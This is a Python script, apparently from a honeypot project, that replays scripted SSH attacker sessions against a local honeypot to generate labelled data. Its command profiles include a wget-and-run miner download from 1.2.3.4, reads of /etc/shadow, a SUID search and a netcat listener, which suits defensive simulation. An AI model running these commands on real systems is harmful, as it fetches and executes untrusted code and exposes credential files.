"""Drives realistic SSH sessions against the HoneyMind honeypot (port 2222) to
populate Postgres with labeled data and to serve as a repeatable live demo.

Usage:
    python tools/attack_simulator.py --host 127.0.0.1 --port 2222 --profile recon
    python tools/attack_simulator.py --all --rounds 3
"""
import argparse
import time
import random
import paramiko

PROFILES = {
    "recon": [
        "whoami", "id", "uname -a", "hostname", "ls", "pwd",
        "cat /etc/passwd", "ls -la /home", "netstat -tulpn",
    ],
    "miner": [
        "whoami", "wget http://1.2.3.4/miner.sh", "chmod +x miner.sh",
        "./miner.sh", "curl http://1.2.3.4/config", "crontab -l",
    ],
    "pentester": [
        "id", "sudo -l", "cat /etc/shadow", "find / -perm -4000 2>/dev/null",
        "nmap -sV 127.0.0.1", "nc -lvnp 4444", "ssh root@10.0.0.5",
    ],
    "benign": [
        "ls", "pwd", "whoami", "cat /var/log/sys.log", "df -h", "uptime",
    ],
}

def run_session(host, port, profile, delay_range=(0.3, 1.2)):
    commands = PROFILES[profile]
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username="root", password="x",
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell()
    time.sleep(0.5)
    chan.recv(65535)  # drain banner
    for cmd in commands:
        chan.send(cmd + "\n")
        time.sleep(random.uniform(*delay_range))
        if chan.recv_ready():
            chan.recv(65535)
    chan.send("exit\n")
    time.sleep(0.3)
    client.close()
    print(f"[{profile}] sent {len(commands)} commands")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--profile", choices=list(PROFILES))
    p.add_argument("--all", action="store_true")
    p.add_argument("--rounds", type=int, default=1)
    args = p.parse_args()

    profiles = list(PROFILES) if args.all else [args.profile]
    if not profiles or profiles == [None]:
        p.error("pass --profile <name> or --all")
    for _ in range(args.rounds):
        for prof in profiles:
            run_session(args.host, args.port, prof)
            time.sleep(0.5)

if __name__ == "__main__":
    main()
